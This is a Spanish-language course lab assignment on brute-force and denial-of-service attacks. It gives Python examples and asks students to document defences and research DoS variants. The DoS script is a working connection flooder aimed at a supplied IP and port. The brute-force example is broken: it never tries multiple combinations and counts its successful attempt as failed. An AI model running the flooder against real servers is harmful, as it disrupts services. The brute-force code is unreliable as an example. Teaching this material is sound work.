# Practica 5 - Unidad 1 Introduccion a la seguridad - Protección contra ataques

## Objetivo

Crear un programa que simule un ataque de fuerza bruta y otro que simule un ataque de denegación de servicio.

## Desarrollo

1. Crear un programa que simule un ataque de fuerza bruta.

Este programa debe recibir un usuario y una contraseña, y debe intentar iniciar sesión en un sistema con estos datos. El programa debe intentar iniciar sesión con diferentes combinaciones de usuario y contraseña hasta que logre iniciar sesión o hasta que se alcance un límite de intentos fallidos.

- El programa debe recibir el usuario y la contraseña como argumentos de línea de comandos.
- El programa debe recibir el límite de intentos fallidos como argumento de línea de comandos.
- El programa debe mostrar un mensaje indicando si logró iniciar sesión o si se alcanzó el límite de intentos fallidos.
- El programa debe mostrar un mensaje indicando cuántos intentos fallidos se realizaron.
- El programa debe mostrar un mensaje indicando cuánto tiempo tardó en realizar el ataque.
- El programa debe mostrar un mensaje indicando cuántas combinaciones de usuario y contraseña se intentaron.

```python
# Ejemplo en Python
import sys
import time

def brute_force(user, password, limit):
    start = time.time()
    attempts = 0
    while attempts < limit:
        attempts += 1
        if user == 'admin' and password == 'password':
            end = time.time()
            print(f'Inició sesión como {user} con la contraseña {password}')
            print(f'Intentos fallidos: {attempts}')
            print(f'Tiempo transcurrido: {end - start} segundos')
            print(f'Combinaciones intentadas: {attempts}')
            return
    end = time.time()
    print(f'No se pudo iniciar sesión')
    print(f'Intentos fallidos: {attempts}')
    print(f'Tiempo transcurrido: {end - start} segundos')
    print(f'Combinaciones intentadas: {attempts}')

if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Uso: python brute_force.py <usuario> <contraseña> <intentos>')
        sys.exit(1)
    user = sys.argv[1]
    password = sys.argv[2]
    limit = int(sys.argv[3])
    brute_force(user, password, limit)
```

```bash
python brute_force.py admin password 1000
```

2. Crear un programa que simule un ataque de denegación de servicio.

Este programa debe enviar una gran cantidad de solicitudes a un servidor para intentar saturarlo y evitar que responda a solicitudes legítimas.

- El programa debe recibir la dirección IP del servidor y el puerto como argumentos de línea de comandos.
- El programa debe recibir la cantidad de solicitudes a enviar como argumento de línea de comandos.
- El programa debe mostrar un mensaje indicando cuántas solicitudes se enviaron.
- El programa debe mostrar un mensaje indicando cuánto tiempo tardó en enviar las solicitudes.

```python
# Ejemplo en Python
import sys
import socket
import time

def dos(ip, port, requests):
    start = time.time()
    for _ in range(requests):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        s.send(b'GET / HTTP/1.1\r\n')
        s.close()
    end = time.time()
    print(f'Se enviaron {requests} solicitudes')
    print(f'Tiempo transcurrido: {end - start} segundos')
  
if __name__ == '__main__':
    if len(sys.argv) != 4:
        print('Uso: python dos.py <ip> <puerto> <solicitudes>')
        sys.exit(1)
    ip = sys.argv[1]
    port = int(sys.argv[2])
    requests = int(sys.argv[3])
    dos(ip, port, requests)
```

```bash
python dos.py "127.0.0.1" 80 1000
```

3. Realizar pruebas de los programas creados.

4. Documentar los resultados obtenidos y las posibles acciones que se pueden realizar para prevenir este tipo de ataques.

5. Investiga y describe los siguientes conceptos:

    - Ataque de fuerza bruta
    - Ataque de denegación de servicio (DoS)
    - Ataque economico de denegación de servicio (EDoS)
    - Ataque de denegación de servicio distribuido (DDoS)
    - Ataque de denegación de servicio por agotamiento de recursos
    - Ataque de denegación de servicio por saturación de ancho de banda

## Entrega

- Documento en formato PDF que contenga la documentación de los resultados obtenidos y las posibles acciones que se pueden realizar para prevenir este tipo de ataques.

## Evaluación

- El documento deberá contener la información solicitada en las instrucciones.
- El documento deberá tener una extensión mínima de 3 cuartillas.
- El documento deberá tener una portada con los datos del alumno y el nombre de la práctica.
- El documento deberá tener un índice con los temas investigados.
- El documento deberá tener una conclusión con los aprendizajes obtenidos.
- El documento deberá tener una bibliografía con las fuentes consultadas.

## Deadline

- Miercoles 09 de Octubre a las 23:59 hrs
